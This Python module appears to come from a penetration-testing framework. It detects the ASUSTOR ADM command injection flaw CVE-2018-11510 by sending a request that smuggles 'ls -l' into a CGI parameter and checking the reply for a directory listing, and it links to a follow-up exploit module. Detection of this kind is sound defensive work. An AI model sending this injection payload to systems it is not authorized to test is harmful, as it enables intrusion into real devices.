#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""ASUSTOR ADM aggrecate_js.cgi unauthenticated RCE (CVE-2018-11510)."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'ASUSTOR ADM - aggrecate_js.cgi RCE Detection (CVE-2018-11510)',
        'description': (
            'Detects CVE-2018-11510 by injecting ls into '
            '/portal/apis/aggrecate_js.cgi?script=launcher"&CMD&" and matching directory listing.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2018', 'asustor', 'nas', 'rce', 'cmdi', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'risk_signal', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['exploits/linux/http/asustor_cve_2018_11510_rce'],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2018-11510',
            'https://packetstormsecurity.com/files/148919/',
        ],
        'cve': 'CVE-2018-11510',
    }

    def run(self):
        path = '/portal/apis/aggrecate_js.cgi?script=launcher%22%26ls%20-l%26%22'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r:
            return False
        if re.search(r'[drwx-]+.*root.*root', r.text or ''):
            self.set_info(
                severity='critical',
                reason='ASUSTOR ADM aggrecate_js.cgi RCE (CVE-2018-11510)',
                path='/portal/apis/aggrecate_js.cgi',
            )
            return True
        return False
